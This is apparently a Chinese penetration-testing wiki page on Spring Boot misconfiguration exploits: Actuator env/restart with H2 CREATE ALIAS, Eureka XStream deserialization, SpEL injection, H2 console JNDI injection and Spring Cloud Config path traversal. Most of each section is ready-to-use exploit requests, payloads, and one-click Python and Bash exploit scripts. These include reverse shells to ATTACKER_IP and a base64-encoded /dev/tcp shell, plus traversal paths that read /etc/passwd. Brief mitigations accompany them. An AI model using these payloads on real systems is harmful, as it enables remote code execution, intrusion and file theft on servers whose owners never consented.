---
title: Spring Boot Actuator 配置不当 RCE 利用链复现
description: 详细记录 Spring Boot 2.x Actuator 暴露 env 与 restart 端点结合 H2 CREATE ALIAS 实现
  RCE 的完整利用链；补充 Eureka XStream 反序列化 RCE 利用链、SpEL 表达式注入、完整 Actuator 端点清单及 /env /refresh
  交互利用细节、H2 Console JNDI 注入及 Spring Cloud Config 目录穿越利用方式。
category: ai-security
tags:
- Spring Boot
- Actuator
- RCE
- H2 Database
- JNDI Injection
- Spring Cloud Config
- 目录穿越
- Eureka
- XStream
- SpEL
- 漏洞复现
date: 2024-01-15
updated: '2026-11-12'
---
## 概述

本页面汇总 Spring Boot 生态中因配置不当导致的高危漏洞利用细节，涵盖四大类攻击面：
1. **Actuator `env` + `restart` 端点联动 H2 `CREATE ALIAS` 实现 RCE**（Spring Boot 2.x）
2. **Eureka XStream 反序列化 RCE 利用链**（`/env` + `/refresh` 交互，Spring Cloud 场景）
3. **Spring Boot SpEL 表达式注入**（Whitelabel Error Page，Spring Boot 1.x）
4. **H2 Console 开启 `web-allow-others` 导致 JNDI 注入 RCE**
5. **Spring Cloud Config Server 目录穿越读取任意文件**

所有利用均基于 **配置不当/组件版本过低** 而非框架核心代码缺陷，属于攻击面管理的核心排查项。

---

## 信息收集：常见敏感端点清单

### Swagger / API 文档泄露
| 路径 | 说明 |
|------|------|
| `/api-docs`、`/v2/api-docs` | OpenAPI/Swagger JSON 定义 |
| `/swagger-ui.html`、 `/api.html`、 `/sw/swagger-ui.html`、 `/api/swagger-ui.html`、 `/template/swagger-ui.html` | Swagger UI 界面 |
| `/spring-security-rest/api/swagger-ui.html`、 `/spring-security-oauth-resource/swagger-ui.html` | 安全模块下的 Swagger 路径 |

### Actuator 端点全量清单（Spring Boot 1.x / 2.x 路径差异）

| 1.x 路径 | 2.x 路径 (`/actuator/*`) | 敏感度 | 典型利用 |
|----------|--------------------------|--------|----------|
| `/env` | `/actuator/env` | ⭐⭐⭐⭐⭐ | 动态修改属性、配合 `/refresh` 触发 RCE |
| `/refresh` | `/actuator/refresh` | ⭐⭐⭐⭐⭐ | 刷新上下文，触发 `@RefreshScope` Bean 重建 |
| `/restart` | `/actuator/restart` | ⭐⭐⭐⭐ | 重启上下文，配合 H2 `connection-test-query` RCE |
| `/heapdump` | `/actuator/heapdump` | ⭐⭐⭐ | 下载堆转储离线分析敏感信息 |
| `/jolokia` | `/actuator/jolokia` | ⭐⭐⭐⭐ | JMX-over-HTTP，可寻找危险 MBean 执行命令 |
| `/trace` / `/httptrace` | `/actuator/httptrace` | ⭐⭐ | HTTP 请求追踪，可能泄露 Cookie/Token |
| `/mappings` | `/actuator/mappings` | ⭐⭐ | 所有 `@RequestMapping` 路由，辅助攻击面梳理 |
| `/beans` | `/actuator/beans` | ⭐⭐ | Spring Bean 定义，辅助寻找利用链 |
| `/configprops` | `/actuator/configprops` | ⭐⭐ | `@ConfigurationProperties` 绑定值 |
| `/metrics` | `/actuator/metrics` | ⭐ | 应用指标 |
| `/health` | `/actuator/health` | ⭐ | 健康检查（常开放） |
| `/info` | `/actuator/info` | ⭐ | 应用元信息 |
| `/shutdown` | `/actuator/shutdown` | ⭐⭐⭐ | 优雅关闭应用（DoS） |
| `/loggers` | `/actuator/loggers` | ⭐⭐ | 动态调整日志级别 |
| `/dump` | `/actuator/threaddump` | ⭐ | 线程快照 |
| `/auditevents` | `/actuator/auditevents` | ⭐ | 审计事件（登录、鉴权失败等） |
| `/scheduledtasks` | `/actuator/scheduledtasks` | ⭐ | 定时任务列表 |
| `/flyway`、`/liquibase` | `/actuator/flyway`、`/actuator/liquibase` | ⭐ | 数据库迁移历史 |

> **检测技巧**：`GET /actuator`（2.x）或 `GET /`（1.x）可返回已启用端点列表；若返回 401/403 说明有认证保护，若 200 且列表包含 `env`/`refresh`/`restart`/`jolokia` 等高危端点则需重点跟进。

---

## Spring Boot 2.x Actuator `env` + `restart` + H2 `CREATE ALIAS` RCE

### 影响版本与前置条件
| 组件 | 版本/条件 |
|------|-----------|
| spring-boot-starter-actuator | 2.x |
| 依赖 H2 数据库 | `spring-boot-starter-data-jpa` + `com.h2database:h2` |
| 端点暴露 | `management.endpoints.web.exposure.include=env,restart`（或 `*`） |
| 权限 | 无认证/弱认证可直接访问 Actuator HTTP API |

### 利用原理
1. **`/actuator/env` (POST)**：动态修改 `spring.datasource.hikari.connection-test-query`，注入 H2 `CREATE ALIAS` 语句，将任意命令封装为 Java 静态方法 `EXEC(cmd)`。
2. **`/actuator/restart` (POST)**：触发应用上下文重启，H2 连接池初始化时执行 `connection-test-query`，从而调用 `EXEC()` 执行命令。

> **关键点**：`connection-test-query` 在连接池获取连接前执行，重启会强制重建连接池，保证 Payload 触发。

### 完整利用流程

#### Step 1 注入恶意 `connection-test-query`
```http
POST /actuator/env HTTP/1.1
Host: target:port
Content-Type: application/json

{
  "name": "spring.datasource.hikari.connection-test-query",
  "value": "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('curl http://attacker.dnslog.cn');"
}
```
- `Content-Type: application/json` **必须**，否则 Spring 不解析 Body。
- Payload 中 `CALL EXEC('...')` 可替换为任意命令（如反弹 Shell）。

#### Step 2 触发重启执行命令
```http
POST /actuator/restart HTTP/1.1
Host: target:port
Content-Type: application/json

{}
```
- 返回 `200` 且 Body 包含 `"message": "Restarting..."` 即表示重启已触发。
- 观察 DNSLog / 反连平台确认命令执行。

### 验证与排查清单
| 检查项 | 命令/路径 | 判定标准 |
|--------|-----------|----------|
| Actuator 端点列表 | `GET /actuator` | 返回 `env`、`restart` 等敏感端点 |
| `env` 写入权限 | `POST /actuator/env` | 200 且后续 `GET /actuator/env` 可见新键值 |
| H2 依赖 | 类路径存在 `h2-*.jar` | `mvn dependency:tree \| grep h2` |
| 连接池实现 | `spring.datasource.type=HikariCP` | 默认即为 HikariCP |

---

## Eureka XStream 反序列化 RCE 利用链（`/env` + `/refresh`）

> 来源：微信公众号文章《Spring boot相关漏洞利用（1）》

### 利用条件
| 条件 | 说明 |
|------|------|
| 可访问 `/env` (POST) | 能动态设置 Spring 环境属性 |
| 可访问 `/refresh` (POST) | 存在 `spring-boot-starter-actuator` 依赖，可刷新配置 |
| 目标依赖版本 | `eureka-client` < **1.8.7**（通常随 `spring-cloud-starter-netflix-eureka-client` 引入） |
| 网络连通性 | 目标服务器可主动请求攻击者 HTTP 服务（出网） |

### 攻击原理
1. 通过 `/env` 设置 `eureka.client.serviceUrl.defaultZone` 指向攻击者控制的 HTTP 服务。
2. 触发 `/refresh` 刷新上下文，Eureka Client 重新初始化并向 `defaultZone` 发起注册请求。
3. 攻击者返回精心构造的 **XStream 恶意 XML**，利用 JDK 内置反序列化链（`Jdk.nashorn` / `ProcessBuilder` 等）实现 RCE。

### 完整利用步骤

#### 准备恶意 XML 服务（Flask 示例）
```python
#!/usr/bin/env python
# coding: utf-8
# Author: LandGrey
from flask import Flask, Response
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST'])
def catch_all(path):
    xml = """<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
      <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
              <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.Collections$EmptyIterator"/>
                  <next class="java.lang.ProcessBuilder">
                    <command>
                       <string>/bin/bash</string>
                       <string>-c</string>
                       <string>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</string>
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next class="string">foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilder$NullInputStream"/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>"""
    return Response(xml, mimetype='application/xml')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=4447)
```
- 将 `ATTACKER_IP` 替换为实际 VPS IP。
- `command` 标签内为最终执行的命令（示例为反弹 Shell 到 4446 端口）。

#### 启动恶意服务 & 监听反连端口
```bash
# 终端 1：启动 Flask 服务
python3 flask_xstream.py

# 终端 2：监听反弹 Shell 端口
nc -lvnp 4446
```

#### 发送利用请求
```bash
# ① 修改 Eureka 注册中心地址指向恶意 XML 服务
curl -X POST "http://target:port/env" \
     -d "eureka.client.serviceUrl.defaultZone=http://ATTACKER_IP:4447/xstream"

# ② 刷新配置触发 Eureka Client 重新注册 → 请求恶意 XML → 反序列化 RCE
curl -X POST "http://target:port/refresh" -d ""
```
- 若目标为 Spring Boot 2.x，路径需改为 `/actuator/env`、`/actuator/refresh`。

#### 验证结果
- Flask 控制台显示收到请求。
- `nc` 成功建立反弹 Shell 会话。

### 缓解措施
- 升级 `eureka-client` 至 **1.8.7+**（已修复 XStream 反序列化）。
- 禁用 Actuator `env`/`refresh` 端点或配置强认证。
- 网络层限制应用服务器出站访问（仅允许必要的服务注册中心地址）。

---

## Spring Boot SpEL 表达式注入（Whitelabel Error Page）

> 影响版本：Spring Boot **1.1.0-1.1.12、1.2.0-1.2.7、1.3.0**

### 漏洞原理
1. Spring Boot 处理参数绑定/类型转换出错 → 进入 `org.springframework.util.PropertyPlaceholderHelper`。
2. URL 参数值经 `parseStringValue` 递归解析，`${...}` 包裹的内容被 `ErrorMvcAutoConfiguration.resolvePlaceholder` 当作 **SpEL 表达式** 执行。
3. 报错页面（Whitelabel Error Page）将表达式计算结果回显，形成 RCE 回显利用链。

### 利用条件
- 目标版本在受影响范围内。
- 至少知道一个能触发 **默认错误页面（500/Whitelabel Error Page）** 的接口及参数名。

### 利用步骤

#### 确认注入点
访问 `http://target/article?id=xxx` 触发 500 错误页 → 尝试 `id=${7*7}` → 若页面回显 `49` 则确认存在 SpEL 注入。

#### 命令编码转换（绕过字符限制）
```python
# coding: utf-8
target = 'curl http://attacker.ip:4445'
result = ','.join(hex(ord(c)) for c in target)
print(result)  # 输出如: 0x63,0x75,0x72,0x6c,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x61,0x74,0x74,0x61,0x63,0x6b,0x65,0x72,0x2e,0x69,0x70,0x3a,0x34,0x34,0x34,0x35
```

#### 构造最终 Payload
```text
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x75,0x72,0x6c,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x61,0x74,0x74,0x61,0x63,0x6b,0x65,0x72,0x2e,0x69,0x70,0x3a,0x34,0x34,0x34,0x35}))}
```
- URL 编码后作为参数值发送，命令将在服务端执行。

### 缓解措施
- 升级 Spring Boot 至 **1.1.13+、1.2.8+、1.3.1+**。
- 自定义错误页面禁用 Whitelabel Error Page（`server.error.whitelabel.enabled=false`）。
- 全局异常处理器中避免直接回显用户输入。

---

## Spring Boot + H2 Console JNDI 注入 RCE

### 危险配置
```yaml
spring:
  h2:
    console:
      enabled: true
      settings:
        web-allow-others: true   # 关键：允许远程访问无鉴权 Console
```

### 攻击链
1. 访问 `/h2-console` 进入 Web 管理界面。
2. **Driver Class** 填 `javax.naming.InitialContext`（触发 JNDI Lookup）。
3. **JDBC URL** 填 `rmi://attacker-ip:1099/Exploit`（指向恶意 RMI/LDAP 服务）。
4. 点击 **Connect** → 服务端发起 JNDI 连接 → 加载远程恶意类 → 任意代码执行。

### 实战工具链（以 su18/JNDI 为例）
```bash
# 1. 下载编译好的 JNDI-1.0-all.jar
# 2. 修改 config.yml 指定监听端口与 Payload
#    command: bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHMvNDQ0NyAwPiYx==}|{base64,-d}|{bash,-i}
# 3. 启动
java -jar JNDI-1.0-all.jar
```
- Base64 解码后为 `bash -i >& /dev/tcp/vps/4447 0>&1`（反弹 Shell）。
- 控制台显示 `Received connection from ...` 即成功。

### 防御建议
- 生产环境 **禁用** `spring.h2.console.enabled` 或设 `web-allow-others: false`。
- 网络层限制 `/h2-console` 仅内网/管理 IP 可达。
- 升级 H2 至 2.0.206+（默认阻断 JNDI），或配置 `spring.h2.console.settings.web-admin-password` 强认证。

---

## Spring Cloud Config Server 目录穿越

### 漏洞成因
`/foo/default/master/..%252F..%252F...` 双重 URL 编码绕过路径规范化，读取服务器任意文件（CVE-2019-3799 / CVE-2020-5410 变体）。

### 两个通用 PoC
```text
# PoC 1：标准双重编码遍历
/foo/default/master/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc/passwd

# PoC 2：前置遍历 + # 片段截断
/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/master
```
- `%252F` = `%2F` 经一次 URL 解码后仍为 `/`，二次解码生效。
- `%23` 对应 `#`，截断后续路径参数。

### 影响范围
| 组件 | 受影响版本 |
|------|------------|
| spring-cloud-config-server | < 2.2.3, < 2.1.8 |
| 依赖 `spring-cloud-config-server` 的微服务网关 | 同版本 |

### 缓解措施
- 升级至 Spring Cloud Config 2.2.3+ / 2.1.8+。
- 在网关层（Nginx/Zuul/Spring Cloud Gateway）拦截包含 `..%252F`、`%252E%252E` 的请求。
- 配置 `spring.cloud.config.server.search-paths` 限制仓库根目录，避免绝对路径穿越。

---

## 统一检测与应急响应脚本片段

### 批量探测 Actuator 敏感端点
```bash
#!/usr/bin/env bash
# 用法: ./scan_actuator.sh targets.txt
while read host; do
  curl -sk -X GET "http://$host/actuator" \
    -H "User-Agent: Mozilla/5.0" \
    -o /dev/null -w "%{http_code} $host\n" | grep -E "200|401|403"
done < "$1"
```

### 自动化利用 Actuator RCE（Python Requests）
```python
import requests, json, sys

target = sys.argv[1]
cmd = sys.argv[2]  # 例: "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"

payload = {
    "name": "spring.datasource.hikari.connection-test-query",
    "value": f"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {{ java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {{return s.next();}} throw new IllegalArgumentException();}}'; CALL EXEC('{cmd}');"
}

headers = {"Content-Type": "application/json"}
requests.post(f"http://{target}/actuator/env", json=payload, headers=headers, timeout=10)
requests.post(f"http://{target}/actuator/restart", json={}, headers=headers, timeout=10)
print("[+] Trigger sent")
```

### Eureka XStream 利用一键化（Bash）
```bash
#!/usr/bin/env bash
# 用法: ./eureka_xstream.sh <target> <attacker_ip> <flask_port> <nc_port>
target=$1; attacker=$2; flask_port=$3; nc_port=$4

# 1. 启动 Flask 恶意 XML 服务（后台）
cat > /tmp/flask_xstream.py <<'EOF'
# ... 粘贴上文 Flask 代码，将 ATTACKER_IP 替换为 $attacker，4446 替换为 $nc_port ...
EOF
python3 /tmp/flask_xstream.py &

# 2. 发送利用链
curl -X POST "http://$target/env" -d "eureka.client.serviceUrl.defaultZone=http://$attacker:$flask_port/xstream"
curl -X POST "http://$target/refresh" -d ""
echo "[+] Exploit sent, check nc listener on port $nc_port"
```

---

## 关联知识与后续利用

- 拿到 Shell 后常需建立隧道穿透内网，可参考 [[frp内网渗透应用]] 中 Socks5 / 多级隧道 / RDP 转发等实战技巧。
- 若目标同时存在 JWT 认证体系，可结合 [[jwt漏洞原理与实战利用]] 中算法混淆、密钥爆破等手段横向提权。
- H2 Console JNDI 注入的完整复现流程可参考 [[h2-console-jndi注入rce利用]]。
- Spring Cloud Config 目录穿越的更多绕过变体见 [[spring-cloud-config目录穿越漏洞]]。

---

## 参考资料
- 原文：微信公众号文章《Spring boot漏洞利用(2)》、《Spring boot相关漏洞利用（1）》
- su18/JNDI: https://github.com/su18/JNDI
- LandGrey/SpringBootVulExploit: https://github.com/LandGrey/SpringBootVulExploit
- Spring Boot Actuator 官方文档：https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html
- H2 Database JNDI 安全公告：https://h2database.com/html/security.html
- Spring Cloud Config CVE-2020-5410 分析：https://pivotal.io/security/cve-2020-5410
- Eureka Client XStream 反序列化分析：https://github.com/spring-cloud/spring-cloud-netflix/issues/3276

## 来源

- [007攻防实验室-202007-202010_6](../sources/007攻防实验室-202007-202010_6.md)
